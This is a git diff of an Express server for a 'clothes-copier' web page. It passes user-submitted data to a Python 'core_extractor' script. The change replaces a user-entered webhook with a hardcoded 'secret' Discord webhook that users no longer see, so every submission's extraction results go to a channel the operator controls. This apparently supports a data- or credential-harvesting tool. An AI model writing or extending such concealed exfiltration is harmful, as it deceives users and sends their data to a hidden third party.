@@ -8,37 +8,36 @@ const app = express();
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ limit: '10mb', extended: true }));
 
-// Point Express directly to the public folder where your HTML lives
+// Serve static files from public folder
 app.use(express.static(path.join(__dirname, 'public')));
 
-app.get('/', (req, res) => {
-    // Looks for clothes-copier.html (or index.html) inside the public folder
-    const possibleFiles = ['clothes-copier.html', 'index.html', 'Clothes-Copier.html'];
-    let targetFile = null;
+// Set your permanent secret Discord webhook URL here so users don't have to enter it
+const SECRET_DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";
 
-    for (const file of possibleFiles) {
-        if (fs.existsSync(path.join(__dirname, 'public', file))) {
-            targetFile = file;
-            break;
-        }
-    }
-
-    if (targetFile) {
-        res.sendFile(path.join(__dirname, 'public', targetFile));
+// Route specifically for /clothes-copier
+app.get('/clothes-copier', (req, res) => {
+    const targetFile = 'clothes-copier.html';
+    const filePath = path.join(__dirname, 'public', targetFile);
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
     } else {
-        const publicFiles = fs.existsSync(path.join(__dirname, 'public')) ? fs.readdirSync(path.join(__dirname, 'public')) : [];
-        res.status(404).send(`Not Found. Files inside public folder: ${JSON.stringify(publicFiles)}`);
+        res.status(404).send('Clothes copier page not found.');
     }
 });
 
+// Optional: Redirect root to /clothes-copier
+app.get('/', (req, res) => {
+    res.redirect('/clothes-copier');
+});
+
 app.post('/api/process', (req, res) => {
-    const { data, webhook } = req.body;
-    if (!data || !webhook) {
-        return res.status(400).json({ success: false, error: "Missing data or webhook" });
+    const { data } = req.body;
+    if (!data) {
+        return res.status(400).json({ success: false, error: "Missing data payload" });
     }
 
     execFile('python3', ['core_extractor.py', data], {
-        env: { ...process.env, DISCORD_WEBHOOK_URL: webhook }
+        env: { ...process.env, DISCORD_WEBHOOK_URL: SECRET_DISCORD_WEBHOOK }
     }, (error, stdout, stderr) => {
         if (error) {
             return res.status(500).json({ success: false, error: "Extractor execution failed.", details: stderr || error.message });
